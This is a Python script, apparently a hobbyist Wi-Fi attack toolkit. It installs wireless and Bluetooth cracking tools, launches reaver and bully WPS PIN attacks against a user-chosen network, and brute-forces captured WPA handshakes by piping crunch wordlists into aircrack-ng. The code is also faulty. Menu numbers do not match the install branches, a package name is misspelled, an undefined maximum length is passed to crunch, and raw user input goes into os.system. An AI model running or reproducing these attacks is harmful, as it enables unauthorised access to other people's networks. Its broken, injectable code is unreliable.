import os

# Author - Mmabiaa
# All rights reserved by the author. Unauthorized use is prohibited.

def wire():

            print("""
1) Aircrack-ng                          17) kalibrate-rtl
2) Asleap                               18) KillerBee
3) Bluelog                              19) Kismet
4) BlueMaho                             20) mdk3
5) Bluepot                              21) mfcuk
6) BlueRanger                           22) mfoc
7) Bluesnarfer                          23) mfterm
8) Bully                                24) Multimon-NG
9) coWPAtty                             25) PixieWPS
10) crackle                             26) Reaver
11) eapmd5pass                          27) redfang
12) Fern Wifi Cracker                   28) RTLSDR Scanner
13) Ghost Phisher                       29) Spooftooph
14) GISKismet                           30) Wifi Honey
15) Wifitap                             31) gr-scan
16) Wifite                              32) Back to main menu
90) airgeddon
91) wifite v2

0)install all wireless tools
""")
            w = int(input("Enter The number of the tool : >>> "))
            if w == 1 :
                cmd = os.system("sudo apt-get update && apt-get install aircrack-ng")
            elif w == 90:
                print("sudo apt-get update && apt-get install git && git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git")
            elif w == 91:
                print("sudo apt-get update && apt-get install git && git clone https://github.com/derv82/wifite2.git")
            elif w == 2 :
                cmd = os.system("sudo apt-get update && apt-get install asleep")
            elif w == 3 :
                cmd = os.system("sudo apt-get update && apt-get install bluelog")
            elif w == 4 :
                cmd = os.system("sudo apt-get update && apt-get install bluemaho")
            elif w == 5 :
                cmd = os.system("sudo apt-get update && apt-get install bluepot")
            elif w == 6 :
                cmd = os.system("sudo apt-get update && apt-get install blueranger")
            elif w == 7 :
                cmd = os.system("sudo apt-get update && apt-get install bluesnarfer")
            elif w == 8 :
                cmd = os.system("sudo apt-get update && apt-get install bully")
            elif w == 9 :
                cmd = os.system("sudo apt-get update && apt-get install cowpatty")
            elif w == 10 :
                cmd = os.system("sudo apt-get update && apt-get install crackle")
            elif w == 11 :
                cmd = os.system("sudo apt-get update && apt-get install eapmd5pass")
            elif w == 12 :
                cmd = os.system("sudo apt-get update && apt-get install fern-wifi-cracker")
            elif w == 13 :
                cmd = os.system("sudo apt-get update && apt-get install ghost-phisher")
            elif w == 14 :
                cmd = os.system("sudo apt-get update && apt-get install giskismet")
            elif w == 15 :
                cmd = os.system("apt-get install git && git clone git://git.kali.org/packages/gr-scan.git")
            elif w == 16 :
                cmd = os.system("sudo apt-get update && apt-get install kalibrate-rtl")
            elif w == 17 :
                cmd = os.system("sudo apt-get update && apt-get install killerbee-ng")
            elif w == 18 :
                cmd = os.system("sudo apt-get update && apt-get install kismet")
            elif w == 19 :
                cmd = os.system("sudo apt-get update && apt-get install mdk3")
            elif w == 20 :
                cmd = os.system("sudo apt-get update && apt-get install mfcuk")
            elif w == 21 :
                cmd = os.system("sudo apt-get update && apt-get install mfoc")
            elif w == 22 :
                cmd = os.system("sudo apt-get update && apt-get install mfterm")
            elif w == 23 :
                cmd = os.system("sudo apt-get update && apt-get install multimon-ng")
            elif w == 24 :
                cmd = os.system("sudo apt-get update && apt-get install pixiewps")
            elif w == 25 :
                cmd = os.system("sudo apt-get update && apt-get install reaver")
            elif w == 26 :
                cmd = os.system("sudo apt-get update && apt-get install redfang")
            elif w == 27 :
                cmd = os.system("sudo apt-get update && apt-get install rtlsdr-scanner")
            elif w == 28 :
                cmd = os.system("sudo apt-get update && apt-get install spooftooph")
            elif w == 29 :
                cmd = os.system("sudo apt-get update && apt-get install wifi-honey")
            elif w == 30 :
                cmd = os.system("sudo apt-get update && apt-get install wifitap")
            elif w == 31 :
                cmd = os.system("sudo apt-get update && apt-get install wifite")
            elif w == 32 :
                quit()
            elif w == 0 :
                cmd = os.system("apt-get install -y aircrack-ng asleap bluelog blueranger bluesnarfer bully cowpatty crackle eapmd5pass fern-wifi-cracker ghost-phisher giskismet gqrx kalibrate-rtl killerbee kismet mdk3 mfcuk mfoc mfterm multimon-ng pixiewps reaver redfang spooftooph wifi-honey wifitap wifite")
            else:
                print("Not Found")

            quit()

def check_attack():
        print("Choose the kind of the attack(External WIFI Adapter Require) ?")
        attack = int(input(""))
        if attack == 1:
            print("\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon))")
            interface = str(input(""))
            print("\nEnter the bssid of the network ?")
            bssid = str(input(""))
            order = ("reaver -i {} -b {} -vv").format(interface,bssid)
            geny = os.system(order)
        
        elif attack == 2:
            print("\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon)")
            interface = str(input(""))
            print("\nEnter the bssid of the network ?")
            bssid = str(input(""))
            print("\nEnter the channel of the network ?")
            channel = int(input(""))
            order = ("bully -b {} -c {} --pixiewps {}").format(bssid,channel,interface)
            geny = os.system(order)
       
        elif attack == 3:
            cmd = os.system("wifite")
       
        elif attack == 4:
            print("\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon)")
            interface = str(input(""))
            print("\nEnter the bssid of the network ?")
            bssid = str(input(""))
            order = ("reaver -i {} -b {} -K").format(interface,bssid)
            geny = os.system(order)

        elif attack == 0 :
            quit()

def check_password(mini,path,essid):
        print("\nEnter your choise here : ?")
        set = str(input(""))
        if set == "1":
            test = str("abcdefghijklmnopqrstuvwxyz")
            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
            geny  = os.system(order)
        elif set == "2":
            test = str("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
            geny  = os.system(order)
        elif set == "3":
            test = str("0123456789")
            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
            geny  = os.system(order)
        elif set == "4":
            test = str("!#$%/=?{}[]-*:;")
            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
            geny  = os.system(order)
        elif set == "5":
            test = str("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
            geny  = os.system(order)
        elif set == "6":
            test = str("abcdefghijklmnopqrstuvwxyz0123456789")
            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
            geny  = os.system(order)
        elif set == "7":
            test = str("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
            geny  = os.system(order)
        elif set == "8":
            test = str("!#$%/=?{}[]-*:;0123456789")
            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
            geny  = os.system(order)
        elif set == "9":
            test = str("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
            geny  = os.system(order)
        elif set == "10":
            test = str("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%/=?{}[]-*:;")
            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
            geny  = os.system(order)
        elif set == "11":
            test = str("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%/=?{}[]-*:;")
            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
            geny  = os.system(order)
        elif set == "12":
            print("Enter you Own Words and numbers")
            test  = str(input(""))
            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
            geny  = os.system(order)
        else:
            print("\nNot Found")

        print("Copy the Password and Close the tool")
